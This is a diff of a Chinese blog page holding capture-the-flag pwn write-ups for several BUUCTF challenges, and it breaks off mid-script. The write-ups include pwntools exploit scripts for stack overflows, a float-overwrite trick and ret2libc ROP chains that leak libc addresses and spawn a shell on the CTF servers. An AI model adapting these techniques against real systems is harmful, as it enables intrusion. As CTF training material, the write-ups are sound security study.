@@ -20,12 +20,12 @@
         <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     
     <meta name="description" content="">
-    <meta name="description" content="0x1.test_your_ncnc一下就完事。 0x2.ripchecksec： 12345678yutao@pwnbaby:~&#x2F;Desktop$ checksec pwn1[*] &amp;#x27;&#x2F;home&#x2F;yutao&#x2F;Desktop&#x2F;pwn1&amp;#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No">
+    <meta name="description" content="0x1.test_your_nc nc一下就完事。 0x2.rip checksec： 12345678yutao@pwnbaby:~&#x2F;Desktop$ checksec pwn1[*] &amp;#x27;&#x2F;home&#x2F;yutao&#x2F;Desktop&#x2F;pwn1&amp;#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:">
 <meta property="og:type" content="article">
 <meta property="og:title" content="BUU_PWN刷题_0x01-0x0F">
 <meta property="og:url" content="http://example.com/2021/06/01/BUU-PWN-0x01-0x0F/index.html">
 <meta property="og:site_name" content="郁涛丶&#39;s Blog">
-<meta property="og:description" content="0x1.test_your_ncnc一下就完事。 0x2.ripchecksec： 12345678yutao@pwnbaby:~&#x2F;Desktop$ checksec pwn1[*] &amp;#x27;&#x2F;home&#x2F;yutao&#x2F;Desktop&#x2F;pwn1&amp;#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No">
+<meta property="og:description" content="0x1.test_your_nc nc一下就完事。 0x2.rip checksec： 12345678yutao@pwnbaby:~&#x2F;Desktop$ checksec pwn1[*] &amp;#x27;&#x2F;home&#x2F;yutao&#x2F;Desktop&#x2F;pwn1&amp;#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2021-05-31T16:00:00.000Z">
 <meta property="article:modified_time" content="2022-04-13T12:02:16.713Z">
@@ -214,7 +214,11 @@
     
     <!-- 谷歌统计  -->
     
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="郁涛丶's Blog" type="application/atom+xml">
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="郁涛丶's Blog" type="application/atom+xml">
 </head>
 
     <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
@@ -494,159 +498,128 @@
             <div class="container container-unloaded">
                 <main class="main post-page">
     <article class="article-entry">
-        <h2 id="0x1-test-your-nc"><a href="#0x1-test-your-nc" class="headerlink" title="0x1.test_your_nc"></a>0x1.test_your_nc</h2><p>nc一下就完事。</p>
-<h2 id="0x2-rip"><a href="#0x2-rip" class="headerlink" title="0x2.rip"></a>0x2.rip</h2><p>checksec：</p>
+        <h2 id="x1.test_your_nc">0x1.test_your_nc</h2>
+<p>nc一下就完事。</p>
+<h2 id="x2.rip">0x2.rip</h2>
+<p>checksec：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~/Desktop$ checksec pwn1</span><br><span class="line">[*] &#x27;/home/yutao/Desktop/pwn1&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
-
 <p>ida打开，有个后门函数：fun()</p>
 <p>双击s到stack of main，15字节，exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xf</span> + <span class="number">8</span>) + p64(<span class="number">0x40118a</span>)</span><br><span class="line"><span class="comment">#具体86还是87/8a要看linux版本，太新的话写86会导致crash，所以题目写了是Ubuntu18</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x3-warmup-csaw-2016"><a href="#0x3-warmup-csaw-2016" class="headerlink" title="0x3.warmup_csaw_2016"></a>0x3.warmup_csaw_2016</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~/Desktop$ file warmup_csaw_2016 </span><br><span class="line">warmup_csaw_2016: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=7b7d75c51503566eb1203781298d9f0355a66bd3, stripped</span><br><span class="line"></span><br><span class="line">yutao@pwnbaby:~/Desktop$ checksec warmup_csaw_2016</span><br><span class="line">[*] &#x27;/home/yutao/Desktop/warmup_csaw_2016&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
-
+<h2 id="x3.warmup_csaw_2016">0x3.warmup_csaw_2016</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~/Desktop$ file warmup_csaw_2016 </span><br><span class="line">warmup_csaw_2016: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=7b7d75c51503566eb1203781298d9f0355a66bd3, stripped</span><br><span class="line"></span><br><span class="line">yutao@pwnbaby:~/Desktop$ checksec warmup_csaw_2016</span><br><span class="line">[*] &#x27;/home/yutao/Desktop/warmup_csaw_2016&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
 <p>程序首先将后门函数sub_40060D的地址给了出来，之后输入v5，0x40+8.</p>
 <p>exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&quot;./warmup_csaw_2016&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28063</span>)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">72</span> + p64(<span class="number">0x40060D</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x4-pwn1-sctf-2016"><a href="#0x4-pwn1-sctf-2016" class="headerlink" title="0x4.pwn1_sctf_2016"></a>0x4.pwn1_sctf_2016</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~/Desktop$ file pwn1_sctf_2016 </span><br><span class="line">pwn1_sctf_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4b1df4d30f1d6b75666c64bed078473a4ad8e799, not stripped</span><br><span class="line">yutao@pwnbaby:~/Desktop$ checksec pwn1_sctf_2016</span><br><span class="line">[*] &#x27;/home/yutao/Desktop/pwn1_sctf_2016&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
+<h2 id="x4.pwn1_sctf_2016">0x4.pwn1_sctf_2016</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~/Desktop$ file pwn1_sctf_2016 </span><br><span class="line">pwn1_sctf_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4b1df4d30f1d6b75666c64bed078473a4ad8e799, not stripped</span><br><span class="line">yutao@pwnbaby:~/Desktop$ checksec pwn1_sctf_2016</span><br><span class="line">[*] &#x27;/home/yutao/Desktop/pwn1_sctf_2016&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>ida打开看了下，有个vuln()函数，还有个get_flag()函数。</p>
 <p>vuln函数中，将I转为you，输入的s有长度限制(32)，所以转换之后最长可以有32*3的长度，大于3C==60.</p>
 <p>所以我们输入20个I，在写入4个垃圾数据，最后覆盖地址。</p>
 <p>exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./level0&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>, <span class="number">25512</span>)</span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span>*<span class="number">20</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> + p64(<span class="number">0x8048F0D</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x5-ciscn-2019-n-1"><a href="#0x5-ciscn-2019-n-1" class="headerlink" title="0x5.ciscn_2019_n_1"></a>0x5.ciscn_2019_n_1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~/Desktop$ file ciscn_2019_n_1 </span><br><span class="line">ciscn_2019_n_1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8a733f5404b1e2c65e1758c7d92821eb8490f7c5, not stripped</span><br><span class="line">yutao@pwnbaby:~/Desktop$ checksec ciscn_2019_n_1</span><br><span class="line">[*] &#x27;/home/yutao/Desktop/ciscn_2019_n_1&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
+<h2 id="x5.ciscn_2019_n_1">0x5.ciscn_2019_n_1</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~/Desktop$ file ciscn_2019_n_1 </span><br><span class="line">ciscn_2019_n_1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8a733f5404b1e2c65e1758c7d92821eb8490f7c5, not stripped</span><br><span class="line">yutao@pwnbaby:~/Desktop$ checksec ciscn_2019_n_1</span><br><span class="line">[*] &#x27;/home/yutao/Desktop/ciscn_2019_n_1&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>有个func()函数，输入的是v1，但是比较的是v2，将v2改为11.28125就OK</p>
 <p>浮点数改为十六进制的话有脚本可以跑，下面说一下具体是怎么实现的。</p>
 <p>首先11.28125转二进制的话是1011.01001。单精度浮点数是4个字节，也就是32位。</p>
 <p>其中最高位是符号位，0为正，1为负。</p>
 <p>接下来的8位是指数位。剩下的23位是尾数部分。</p>
-<p>1011.01001 ==  1011.01001*2^0  ==  1.01101001*2^3</p>
+<p>1011.01001 == 1011.01001*2^0 == 1.01101001*2^3</p>
 <p>所以指数位就是（127+指数(3) ）的二进制表示，也就是1000 0010，至于为什么是127，规定。。</p>
 <p>连起来就是01000001001101001000000000000000，十六进制表示就是0x4134800。</p>
 <p>所以将v2覆盖为上面的值就OK。</p>
 <p>exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./ciscn_2019_n_1&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>, <span class="number">26204</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">4</span>) + p64(<span class="number">0x41348000</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x6-jarvisoj-level0"><a href="#0x6-jarvisoj-level0" class="headerlink" title="0x6.jarvisoj_level0"></a>0x6.jarvisoj_level0</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~/Desktop$ file level0 </span><br><span class="line">level0: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8dc0b3ec5a7b489e61a71bc1afa7974135b0d3d4, not stripped</span><br><span class="line">yutao@pwnbaby:~/Desktop$ checksec level0</span><br><span class="line">[*] &#x27;/home/yutao/Desktop/level0&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
-
+<h2 id="x6.jarvisoj_level0">0x6.jarvisoj_level0</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~/Desktop$ file level0 </span><br><span class="line">level0: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8dc0b3ec5a7b489e61a71bc1afa7974135b0d3d4, not stripped</span><br><span class="line">yutao@pwnbaby:~/Desktop$ checksec level0</span><br><span class="line">[*] &#x27;/home/yutao/Desktop/level0&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
 <p>ida打开，有个后门函数，也有个vulnerable_function()函数</p>
 <p>exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./level0&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>, <span class="number">28745</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>) + p64(<span class="number">0x40059A</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x7-ciscn-2019-c-1"><a href="#0x7-ciscn-2019-c-1" class="headerlink" title="0x7.ciscn_2019_c_1"></a>0x7.ciscn_2019_c_1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~/Desktop$ file ciscn_2019_c_1 </span><br><span class="line">ciscn_2019_c_1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=06ddf49af2b8c7ed708d3cfd8aec8757bca82544, not stripped</span><br><span class="line">yutao@pwnbaby:~/Desktop$ checksec ciscn_2019_c_1</span><br><span class="line">[*] &#x27;/home/yutao/Desktop/ciscn_2019_c_1&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
-
+<h2 id="x7.ciscn_2019_c_1">0x7.ciscn_2019_c_1</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~/Desktop$ file ciscn_2019_c_1 </span><br><span class="line">ciscn_2019_c_1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=06ddf49af2b8c7ed708d3cfd8aec8757bca82544, not stripped</span><br><span class="line">yutao@pwnbaby:~/Desktop$ checksec ciscn_2019_c_1</span><br><span class="line">[*] &#x27;/home/yutao/Desktop/ciscn_2019_c_1&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
 <p>程序的漏洞在encrypt()函数里面，可以发现在gets时，存在栈溢出的漏洞，这题并没有后门函数，但有puts函数，可以用来泄露libc版本并构造ROP链。</p>
 <p>在__libc_csu_init()函数的最后有个pop rdi,ret，可以用来构造ROP。</p>
 <p>如果输入的字符串太少是不会进行加密的，</p>
 <p>程序刚运行：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/gx 0x6020ac</span><br><span class="line">0x6020ac &lt;x&gt;:	0x0000000000000000</span><br></pre></td></tr></table></figure>
-
 <p>进行一次加密后：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/gx 0x6020ac</span><br><span class="line">0x6020ac &lt;x&gt;:	0x000000000000005b</span><br></pre></td></tr></table></figure>
-
 <p>我们构造的payload是120，满足需要加密的条件。</p>
 <p>exp1：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./ciscn_2019_c_1&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="string">&#x27;29497&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">ret_addr = <span class="number">0x4006b9</span><span class="comment">#这里是用来平等栈的，因为题目环境是Ubuntu18</span></span><br><span class="line"><span class="comment">#Ubuntu18调用system时要对齐栈，需要加一个ret来平衡，否则会crash。</span></span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x58</span>*<span class="string">&#x27;a&#x27;</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(e.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">io.sendlineafter(<span class="string">&quot;your choice!\n&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;to be encrypted\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Ciphertext\n&quot;</span>)</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;your choice!\n&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">payload = <span class="number">0x58</span> * <span class="string">&#x27;a&#x27;</span> + p64(ret_addr) +p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"><span class="comment"># 也可以多加几个ret，看出栈对齐的字节数。</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;to be encrypted\n&quot;</span>,payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Ciphertext\n&quot;</span>)</span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>也有另一种绕过加密的方法，就是让v0&gt;=strlen(s)，我们可以让strlen(s)的长度为0，也就是让字符串的第一个字符为“\x00”，那样strlen函数读取到第一个字符串就会终止，就可以绕过加密。</p>
+<p>也有另一种绕过加密的方法，就是让v0&gt;=strlen(s)，我们可以让strlen(s)的长度为0，也就是让字符串的第一个字符为“”，那样strlen函数读取到第一个字符串就会终止，就可以绕过加密。</p>
 <p>exp2：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = remote(&quot;node3.buuoj.cn&quot; , 27728)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_2019_c_1&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./ciscn_2019_c_1&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt =elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got= elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">pop_rid_ret = <span class="number">0x400c83</span></span><br><span class="line">main_addr = <span class="number">0x400b28</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Welcome to this Encryption machine\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&quot;\x00&quot;</span> + <span class="string">b&quot;A&quot;</span>*(<span class="number">80</span> - <span class="number">1</span> + <span class="number">8</span>) + p64(pop_rid_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line">puts_addr = io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,<span class="literal">True</span>)</span><br><span class="line">puts_addr = u64(puts_addr.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#puts_addr = puts_addr.ljust(8,b&#x27;\x00&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-------------------&gt;&quot;</span>,<span 